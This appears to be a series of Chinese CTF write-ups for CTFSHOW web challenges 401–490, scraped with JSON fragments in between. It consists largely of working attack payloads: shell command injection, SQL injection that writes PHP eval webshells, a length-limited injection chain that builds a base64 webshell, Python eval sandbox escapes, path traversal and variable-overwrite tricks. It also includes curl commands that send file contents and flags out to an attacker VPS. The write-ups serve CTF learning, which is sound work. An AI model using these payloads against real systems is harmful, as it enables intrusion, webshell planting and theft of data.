web401这题把解析后的URL打印了出来，然后比上题多过滤了反斜杠，不过不影响做题 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web402这题对scheme协议做了过滤，要求不能出现http和https，随便输入个东西替换即可 方法一：反引号执行系统命令 把http换成1，然后跟之前一样传参即可 1?url=1://`ls`/../var/www/html/1.txt 读取1.txt内容 读取flag 1?url=1://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=1://$(ls)/../var/www/html/1.txt 读取flag 1?url=1://$(cat fl0g.php)/../var/www/html/1.txt web403先看看代码 过滤规则改了，我们分析一下 1if(preg_match('/^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$/', $url['host'])){ 这段代码用正则表达式判断 $url['host'] 是否是一个合法的IPv4地址。具体解释如下： /^...$/ ：匹配整个字符串（从头到尾），保证整个输入就是IP，不夹杂其他字符 ((2[0-4]\\d|25[0-5]|[1]?\\d\\d?)\\.){3} ：匹配前三段，每段数字+点。每段数字规则如下： 2[0-4]\\d：匹配200-249 25[0-5]：匹配250-255 ?\\d\\d?：匹配0-199（包括1位、2位、3位数字，即0-9、00-99、100-199） 最后一段没有点，只剩数字部分，规则同上 综合起来，这个正则表达式能精确匹配0.0.0.0~255.255.255.255范围内的IPv4地址格式 因此之前的方法一和方法二都用不了，但是方法三可以用了，咱们用分号截断之前的命令并执行新命令 读取当前目录内容 1?url=http://127.0.0.1/1;echo `ls` &gt; 1.txt 读取flag 1?url=http://127.0.0.1/1;echo `cat fl0g.php` &gt; 1.txt web404这题说起来挺好笑的，刚开始看到标题写了“容器生成较慢，得多等一会儿”，我真以为要多等一会，硬生生等了几十分钟，结果点进去还是404，就觉得奇怪。后面看到图片还一闪一闪的，好家伙这网页还带自动刷新的，发现不对劲后点开源码看看，结果真被坑了 后面想了一会，应该是因为这题是web404，估计官方想借此整活，也是被气笑了 回归正题，我们看到源码里写了404.php，拼接进网页访问 可以看到比上题多了个正则匹配 1if(preg_match('/^\\/[A-Za-z0-9]+$/', $url['path'])){ 简单来说，这个正则表达式检测的字符串必须是： 以斜杠 / 开头 斜杠后面跟着至少一个字母或数字 整个字符串中不能有空格或其他符号 比如符合的路径有： /abc /A1B2C3 /12345 然后host部分的正则匹配也改了 1if(preg_match('/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)./', $url['host'])){ 其中： (2[0-4]\\d|25[0-5]|[1]?\\d\\d?) 是0-255范围内的一段数字 ((...)\\.){3} 表示前三个数字段加点 但因为最后的.是匹配任意字符，该正则会匹配形如“192.168.1.1a”或“10.0.0.1/”这类，末尾允许至少跟着一个字符，不是严格的IP地址校验。而且也没有用开头 ^ 和结尾 $ 锚点来表示必须完全匹配整个字符串，这给了我们机会，可以用分号截断命令 读取当前目录内容 1?url=http://127.0.0.1;echo `ls` &gt; 1.txt;/1 读取flag 1?url=http://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1 web405先看看代码 这次多了对scheme的检测，要求必须包含波浪号、点号或者php字符其中之一，因此我们改一下协议即可，方法跟之前一样 读取当前目录内容 1?url=php://127.0.0.1;echo `ls` &gt; 1.txt;/1 读取flag 1?url=php://127.0.0.1;echo `cat fl0g.php` &gt; 1.txt;/1 web406先看代码 源码提示flag in db，说明flag放在数据库。然后对传入的参数url进行了过滤，去除了无效url地址 用联合注入写入webshell即可，空格用/**/代替，不然会不行 1?url=http://127.0.0.1/'union/**/select/**/1,'&lt;?=eval($_POST[1]);?&gt;'/**/into/**/outfile/**/'/var/www/html/1.php# 然后打开1.txt查看，可以看到成功写入 蚁剑连接webshell即可 可以看到有个config.php配置文件 打开可以获取数据库账号密码 然后打开数据库操作页面 添加数据库，如图所示 成功找到flag web407先看代码 这题改成了要求输入参数ip，且要求必须为IP地址以通过FILTER_VALIDATE_IP验证 然后我们的目标是执行cafe类的add函数，可以用::来调用函数 payload： 1?ip=cafe::add cafe::add会被当成IPv6地址，从而通过FILTER_VALIDATE_IP验证，展开的话就类似 1cafe:0000:0000:0000:0000:0000:0000:0add 然后打开网页源代码查看flag即可 我们分析一下IPv6构造： IPv6地址的构造规则比较复杂，支持多种简写和压缩形式 IPv6地址由8组4位十六进制数字（0-9，a-f）组成，中间用冒号 : 分隔，如 2001:0db8:85a3:0000:0000:8a2e:0370:7334 可以使用双冒号 :: 缩写连续的零，比如 2001:db8::1 表示中间连续的0可省略 各部分区段中的数字可以使用小写或大写的十六进制字符 用个表格来概括就是 特点 说明 长度 128位（二进制） 分组 8组，每组16位，用冒号分隔 表示 采用十六进制数字表示，每组4位 前导零省略 可省略每组开头的零 连续多个0压缩为:: 每个地址只能出现一次:: 地址类型多样 单播、组播、任播，特殊前缀表示不同用途 IPv4兼容和过渡地址 支持将IPv4嵌入IPv6地址 接口标识符自动生成 通过EUI-64等标准根据MAC生成 例如，典型IPv6地址是 12001:0db8:85a3::8a2e:0370:7334 它等价于展开的 12001:0db8:85a3:0000:0000:8a2e:0370:7334 web408先看代码 这次改成了验证是否满足邮箱格式了，我们介绍一下FILTER_VALIDATE_EMAIL FILTER_VALIDATE_EMAIL 是 PHP 内置的一个专门用来验证电子邮件格式是否合法的过滤器 它会根据RFC 5322标准对邮箱格式做校验，包括： 检查是否存在且且只有一个 @ 符号 @ 前面的部分是邮箱用户名，允许的字符包括字母、数字、点 (.)、下划线 (_) 和连字符 (-) 等 @ 后面的部分是邮箱域名，必须包含有效的域名格式，比如 example.com，包含至少一个点号 (.)，并且顶级域名部分也要正确 避免使用不合法或不允许的特殊字符 验证邮箱的整体格式符合国际标准，不过不验证邮箱是否真实存在 然后file_put_contents格式为 1file_put_contents(string $filename, mixed $data [, int $flags = 0 [, resource $context]]) $filename：要写入的文件路径和名称，如果文件不存在，则会自动创建 $data：写入文件的数据，可以是字符串、数组或者流资源 $flags（可选）： FILE_APPEND：将数据追加到文件末尾，而不是覆盖 LOCK_EX：写入时给文件加独占锁，以防止其他进程同时写入导致数据混乱 FILE_USE_INCLUDE_PATH：在包含路径中搜索文件 $context（可选）：用于修改资源流的行为 可以把非法字符放在双引号里绕过email@的前缀限制，因此payload为 1?email=&quot;&lt;?=eval($_POST[1]);?&gt;&quot;@1.php 然后蚁剑连接 在根目录找到flag web409先看代码 会过滤掉任意字符后的flag，这题我们可以通过闭合PHP代码来做 payload： 1?email=&quot;flageval($_POST[1]);?&gt;&quot;@1.com 通过在前面加上flag来触发$email=preg_replace('/.flag/', '', $email);这一行代码，会删掉前面的&quot;flag，接着?&gt;闭合代码 然后POST传参执行命令即可 11=system('ls /'); 读取flag即可 11=system('cat /flag'); web410先看代码 这次是通过布尔判断输入的b是否是”1“ 根据PHP文档，FILTER_VALIDATE_BOOLEAN 会把下列字符串（不区分大小写）视为true： &quot;1&quot; &quot;true&quot; &quot;on&quot; &quot;yes&quot; 以下对应的字符串（不区分大小写）视为false： &quot;0&quot; &quot;false&quot; &quot;off&quot; &quot;no&quot; &quot;&quot;（空字符串） 然后题目过滤了大于0的数字和true字符串，那我们传入on和yes都可以，大小写都行 payload： 1?b=yes 或者 1?b=on web411先看代码 跟上题一样，不过这次把on的大小写过滤了，我们用yes或TRUE等都可以，太多方法可以绕过了 payload： 1?b=yes web412先看代码 这次是POST传参ctfshow，然后添加到flag.php末尾，同时前面还有个注释符// 用%0a换行即可 payload： 1ctfshow=%0aeval($_POST[1]); 然后蚁剑连接webshell 在flag.php找到flag web413这题相比上一题，注释的方式改了 ctfshow变量被包含在多行注释符/**/里面了 只需前后加个注释符即可 payload： 1ctfshow=*/eval($_POST[1]);/* 然后跟上题一样，蚁剑连接webshell，在flag.php找到flag web414先看代码 我们简单分析一下代码 1if ($ctfshow == true) 判断变量$ctfshow是否等于true，只有在$ctfshow为真时，才会执行内部判断 1sqrt($ctfshow) &gt;= sqrt(intval($flag)) sqrt()是取平方根函数 intval($flag)将$flag转换为整数 判断$ctfshow的平方根是否大于等于$flag整数值的平方根 只有当$ctfshow的平方根小于$flag整数的平方根时，才会显示flag 然后我们再来分析一般情况下布尔判断条件 被视为 false 的值： 布尔 false 整数 0 浮点数 0.0 空字符串 &quot;&quot;（包含字符串 “0”） 字符串 &quot;0&quot; 空数组 [] NULL 被视为 true 的值： 任意非零数字，例如1、-1、3.14 非空字符串，且不等于 &quot;0&quot;，如 &quot;false&quot;、&quot;off&quot;、&quot;hello&quot; 等都会被认为是真 非空数组 资源类型 对象 因此这题我们只要传入非零负数即可成功通过验证 payload： 1?ctfshow=-1 web415先看代码 在PHP中，函数名是不区分大小写的，这意味着定义函数时用的名字，如getflag()，在调用时可以写成getflag()、GetFlag()、GETFLAG()等，都会被正确识别并调用 不过需要注意的是，虽然函数名调用不区分大小写，但变量名是区分大小写的 payload： 1?k=getFlag 然后源代码查看flag即可 web416先看代码 我们要调用的是ctf类中的flag方法，直接用双冒号操作符即可 补充解释一下，它主要用于： 访问类的静态属性和静态方法 访问类的常量 调用父类（parent::）、当前类（self::）、或静态绑定类（static::）的成员 payload： 1?f=ctf::flag 然后源代码查看flag即可","link":"/posts/ctfshow-others-1-web396-web416/"},{"title":"CTFSHOW | 其他篇题解（二）web417 - web437","text":"前言由于题目比较多，所以分三个部分来写，这是第二部分 题目列表web417有个3.php文件，下载后是一段加密代码，用ai解密 得到代码 12345678include('flag.php');$c=$_GET['ctf'];if($c=='show'){ echo $flag;}else{ echo 'FLAG_NOT_HERE';}?&gt; GET传入 1?ctf=show 成功得到flag web418先看代码 由于变量key已经被赋值为0，因此这个后门没什么用，需要另辟蹊径 然后我们可以看到有个extract函数，这是PHP里的一个函数调用。extract()作用是把数组里的键名当作变量名，在当前作用域创建同名变量，并赋值为数组的对应值。比如$_POST['wayne']=123时，extract($_POST);之后就有了变量$wayne=123 我们看这个代码 1$die?die('FLAG_NOT_HERE'):clear($clear); 由于变量die没有被赋值，因此可以进行变量覆盖。这是三目运算符，我们可以传入0来触发后面的clear($clear) 继续往下划，可以看到clear函数的定义 给变量clear用分号截断命令即可，POST传入 1die=0&amp;clear=;echo '&lt;?=eval($_POST[1]);?&gt;'&gt;/var/www/html/1.php 然后蚁剑连接 在网页根目录找到flag web419先看代码 这题要求POST传入参数code，且长度要小于17，然后eval执行php代码 咱们用反引号执行命令即可，把当前目录下的flag.php复制到1.txt payload： 1code=`cp f* 1.txt`; 然后打开1.txt读取flag即可 web420先看代码 这次code长度被限制在8位以内，也就是7位，然后eval函数也换成了system。有几个方法可以做这题 方法一：nl输出 nl命令是Linux系统中的一个命令行工具，全称是“number lines”，用于给文本文件或标准输入的每一行添加行号，并将结果输出。它类似于cat -n，但nl对行号显示格式和处理方式更灵活 经过尝试，发现flag在/var/www目录里面 payload： 1code=nl ../* 方法二：写文件并执行 非常妙的一个方法，强烈建议学习，参考文章：命令注入长度限制绕过 假设我们要写入webshell 目标是传入echo PD89ZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php; 先用重定向符创建文件，依次执行以下命令 12345678910111213141516171819&gt;hp\\;&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\-\\\\&gt;4\\ \\\\&gt;e6\\\\&gt;bas\\\\&gt;=\\|\\\\&gt;w=\\\\&gt;0pO\\\\&gt;bMV\\\\&gt;U1R\\\\&gt;1BP\\\\&gt;gkX\\\\&gt;hbC\\\\&gt;ZXZ\\\\&gt;PD89\\\\&gt;o\\ \\\\&gt;ech\\\\ 然后把这些文件名以时间倒序形式写入任意一个文件，例如0 1ls -t&gt;0 最后运行文件即可，会执行0里面的命令，然后在当前目录创建一个1.php 1sh 0 连接蚁剑即可 成功找到flag web421先看代码 这次是要求code长度小于6，也就是长度为5 经过测试，发现flag就在当前目录。直接nl读取就可以 payload： 1code=nl f* 然后打开源代码查看flag web422先看代码 相比上题，这题的code长度被限制在5以内 直接nl打印全部内容即可 payload： 1code=nl * 然后查看网页源码 web423打开源代码，可以看到提示 拼接code参数，一开始用PHP和直接执行命令都不行。经过测试，这个网站是python文件运行的，要用python代码执行 payload： 1?code=os.popen('ls').read() 可以把原始代码打印出来看看 1?code=os.popen('cat app.py').read() 1234567891011121314from flask import Flask from flask import request import os app = Flask(__name__) @app.route('/') def app_index(): code = request.args.get('code') if code: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 执行命令获取flag即可 1?code=os.popen('cat /flag').read() web424这题用?code=os.popen('ls').read()会报内部错误，既然执行命令不可以，我们试试直接用open函数读取文件 1?code=open('app.py').read() 成功执行，得到网页源码 1234567891011121314from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到，这次没有了os模块，没办法执行系统命令了，不过不影响我们读取文件 payload： 1?code=open('/flag').read() 成功得到flag web425跟上题一样，先读取源代码看看 1?code=open('app.py').read() 123456789101112131415from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: if 'os' not in code: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题相比上题，过滤了code里面的os字符串，其他都是一样的，不影响我们做题 payload： 1?code=open('/flag').read() web426上题的payload也能用，先看源码 1?code=open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|popen') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题的正则匹配改了，简单解释一下 re.compile(r'os|popen') 创建了一个模式，表示“匹配 os 或 popen” 竖线 | 是“或”的意思 reg.match(code) 表示只从字符串开头匹配： 如果字符串开头含 os 或 popen，匹配成功 否则匹配失败（即 None） 也就是开头不能包含os和popen，不过对我们影响不大 payload： 1?code=open('/flag').read() web427可以继续用上题的payload，先看源码 1?code=open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|popen|system') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题比上题多过滤了system，不影响做题 payload： 1?code=open('/flag').read() web428可以继续用上题的payload看源码 1?code=open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|popen|system|read') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题比上题多过滤了read，不过因为reg.match(code)匹配的是开头，所以对我们没有影响 payload： 1?code=open('/flag').read() web429这题一开始用open('app.py').read()执行不了，猜测是某个地方被过滤了，经过尝试，在前面加个空格即可绕过限制 1?code= open('app.py').read() 源代码： 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到，这题过滤了open字符串，因为re.match() 是从字符串开头匹配，所以我们在前面加个空格即可绕过 payload： 1?code= open('/flag').read() web430可以用上题的payload，先看源代码 1?code= open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题把eval也过滤了，不过对我们没影响 payload： 1?code= open('/flag').read() web431继续用上题的方法做就好，看看源码 1?code= open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval|str') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这次多过滤了str，不影响做题 payload： 1?code= open('/flag').read() web432这题用不了之前的方法了，看了网上其他师傅的做法，可以用类似SSTI模板注入的方法来做，构造一条命令执行的链子 由于os.system()不会把命令的输出结果返回给 Python 程序，所以我们用curl外带数据显示 payload： 1?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`ls`')) 简单解释里面的一些代码 1__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm') __builtins__：是 Python 的一个内置模块，包含了所有内建函数和对象（如 print, str, dict 等）。它在任何 Python 代码中都可以直接访问 __dict__：这是 Python 对象的一个特殊属性，它是一个字典（dict），存储了该对象（这里是 __builtins__ 模块）的所有属性。键是属性名，值是属性本身 __builtins__.__dict__['__import__']：这部分代码通过字典键值查询的方式，从 __builtins__ 模块中获取了内建函数 __import__。这和直接写 __import__ 是一样的，但更隐蔽 __getattribute__：是 Python 对象的一个方法，用于获取对象的属性。os.__getattribute__('system') 的效果和 os.system 完全一样 %2b表示+号，目的是为了绕过正则匹配限制 我们可以通过curl把app.py内容转为base64编码外带到vps显示 1?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`base64 -w 0 app.py`')) 默认情况下，base64 命令输出的编码字符串会在每 76 个字符后自动换行，所以我们不用cat app.py|base64，会显示不完整，我们用base64 -w 0 app.py即可，参数 -w 0表示取消换行 解码base64，成功得到网站源码 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到之前的reg.match(code)改成了reg.search(code)，意味着从检测开头变换到检测整个字符串 最后找flag就可以 payload： 1?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`cat /flag`')) 得到的flag没有括号，自行加个括号就可以 web433直接用上题的payload会不行，经过测试发现去掉builtins就可以了 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`ls`')) 也可以把so反转成os，[::-1] 是 Python 中字符串切片的写法，表示反转字符串。'so'[::-1]结果是 os 1?code=str(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`ls`')) 老样子，我们看看源码，方法跟上题一样，base64带出来 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval|builtins') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题把builtins模块禁了，我们直接import就可以 payload： 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`cat /flag`')) web434经过测试，发现这题是把curl过滤了，加个'%2b'在中间就可以 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('cu'%2b'rl http://你的vps地址:端口?p=`ls`')) 我们看看源码 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): &quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot; inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: #转完之后不是半角字符返回原来的字符 return uchar return chr(inside_code) def stringQ2B(ustring): &quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot; return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) reg = re.compile(r'os|open|system|read|eval|builtins|curl') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 发现多了两个函数，用于将字符串中的全角字符转换为半角字符，然后后面调用 stringQ2B 将 code 中的全角字符全部转为半角，返回结果重新赋值给 code，对我们影响不大 payload： 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('cu'%2b'rl http://你的vps地址:端口?p=`cat /flag`')) web435测试发现是把下划线禁了，我们可以用web433提到的字符串切片方法来反转字符串 首先构建反转代码，我们可以直接引入os，然后调用里面的system函数，原始代码：import os; os.system(&quot;curl http://你的vps地址:端口?p=ls&quot;) 1?code=str(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1]) 可以在网页看到原始代码 我们具体解释一下[::-1]代码，Python 的切片语法是： 1sequence[start:stop:step] start 是切片起始索引（包含该位置） stop 是结束索引（不包含该位置） step 是步长（跨越的索引间隔） 其中三个参数都可以省略 [::-1] 的含义： start 和 stop 都省略，表示从序列的头到尾 step 是 -1 ，表示步长为-1，即反向遍历序列 这样会创建序列的反转副本，不改变原序列 然后我们用exec执行这串代码就可以 payload： 1?code=str(exec(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 可以把它的源码爆出来看看 1?code=str(exec(')&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): &quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot; inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: #转完之后不是半角字符返回原来的字符 return uchar return chr(inside_code)def stringQ2B(ustring): &quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot; return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) reg = re.compile(r'os|open|system|read|eval|builtins|curl|_') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 最后我们找flag就可以 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web436可以继续用上题的方法 我们把源码爆出来看看 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): &quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot; inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: #转完之后不是半角字符返回原来的字符 return uchar return chr(inside_code)def stringQ2B(ustring): &quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot; return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题把getattr过滤了，不过不影响我们做题，步骤跟上题一样 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web437跟上题一样的方法 爆出源码看看 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) if '\\\\u' in code: return 'hacker?' reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 多了个if '\\\\u' in code，\\\\u 是一种表示 Unicode 编码字符 的转义序列 具体说明： 在字符串里，\\u 后面跟着 4 位十六进制数字，用来表示一个 Unicode 字符的编码 比如 \\u4f60 表示汉字 “你”，\\u597d 表示汉字 “好” 这种写法在很多编程语言和数据格式（如 JSON）中都用来表达非 ASCII 字符 这次过滤对我们影响不大，可以继续用上题的步骤 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1]))","link":"/posts/ctfshow-others-2-web417-web437/"},{"title":"CTFSHOW 中期测评（一）web486 - web501","text":"题目列表web486打开之后发现是个登录框，PATH为/index.php?action=login 尝试修改/index.php?action=login为/index.php?action=1，发生报错 由报错内容可知网站可能存在文件包含漏洞，尝试进行目录穿越读取flag 1/index.php?action=../flag 访问源码得到flag web487修改/index.php?action=login为/index.php?action=../index，可以查看源码 存在SQL注入漏洞，而且没有过滤，测试后发现没有回显，用时间盲注 先验证一下 1/index.php?action=check&amp;username=1&amp;password=') or sleep(3)--+ 没有问题 这里用sqlmap去跑结果了，省点时间 1python sqlmap.py -u &quot;https://39dc9317-0164-419c-ac40-b3d76de931e5.challenge.ctf.show/index.php?action=check&amp;username=1&amp;password=1&quot; --batch -D ctfshow -T flag -C flag --dump web488打开题目之后，也是跟之前一样读取index代码 1/index.php?action=../index sql那里两个参数都被md5包裹了，不能用sql注入做了。继续往下分析，可以看到有个templateUtil::render('error',array('username'=&gt;$username))，暂时不知道templateUtil类和render函数有何用处 同时看到上面include了两个php文件 通过目录穿越读取这两个文件代码分析后，发现 render_class.php 有用，db_class.php 则是数据库的一些连接配置，暂时用不到 1/index.php?action=../render/render_class 可以看到里面定义了render函数和shade函数，其中render函数我们重点关注以下代码 123456else{ $templateContent=fileUtil::read('templates/'.$template.'.php'); $cache=templateUtil::shade($templateContent,$arg); cache::create_cache($template,$cache); echo $cache;} $templateContent 获取templates/$template.php页面返回的内容，然后$cache调用shade函数替换$templateContent 中的字符串，把{{username}}替换为传入的数组key:value中的value值，最后再调用cache类中的create_cache函数 上面可以看到包含了cache_class.php，我们继续看看create_cache函数有什么作用 1/index.php?action=../render/cache_class create_cache函数先检查是否存在文件cache/md5($template).php，如果没有则创建一个php文件，并把$content写进去，其中$content我们可以控制，且$template也是固定的，那就很简单了 利用链： 1templateUtil::render() -&gt; templateUtil::shade() -&gt; cache::create_cache() -&gt; fileUtil::write() 我们看看index关键代码 1234567891011if($action=='check'){ $username=$_GET['username']; $password=$_GET['password']; $sql = &quot;select id from user where username = '&quot;.md5($username).&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;; $user=db::select_one($sql); if($user){ templateUtil::render('index',array('username'=&gt;$username)); }else{ templateUtil::render('error',array('username'=&gt;$username)); }} $user不存在时就会进入else语句，然后传入$template为 error，数组为[username: 任意内容]。我们可以写个webshell进去，因为error的md5值为cb5e100e5a9a3e7f6d1fd97512215282，文件会上传到 1cache/cb5e100e5a9a3e7f6d1fd97512215282.php 要注意如果已经查询过的话，会进入else分支，那么cache/cb5e100e5a9a3e7f6d1fd97512215282.php就已经存在了，后面再查询就会返回true，无法再进入create_cache函数的else分支，也就无法再写入webshell了，这种情况只能重开靶机，这一点要注意 可以输入/index.php?action=error测试一下，访问templates/error.php，可以看到页面返回{{username}}不存在，正好符合条件，可以把{{username}}置换为我们传入的任意内容 重开靶机，然后GET传入payload 1/index.php?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;password=123 显示不存在即为成功 然后蚁剑连接，路径为cache/cb5e100e5a9a3e7f6d1fd97512215282.php，要注意把https改成http 在根目录找到flag web489继续看index代码 1/index.php?action=../index 可以看到else分支改了，不能上传内容到error那里了，但是题目给出了关键代码extract($_GET)，意思是将 $_GET 数组中的所有键值对转换成对应的普通变量，那我们可以通过变量覆盖来触发templateUtil::render('index',array('username'=&gt;$username))，效果跟上题一样 这次题目贴心给出了cache清除代码，如果你在登录框尝试登录过，那可以通过输入/index.php?action=clear来清除cache目录，这样就不用重启靶机了 1234if($action=='clear'){ system('rm -rf cache/*'); die('cache clear');} 方法跟上题差不多，不过payload要改成 1/index.php?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;sql=select 1; 通过变量覆盖使if永真，然后读取的位置从error变成了index，其他一样 在根目录找到flag web490先来看看index代码，方法跟之前一样 我们关注重点以下代码 12345678910if($action=='check'){ extract($_GET); $sql = &quot;select username from user where username = 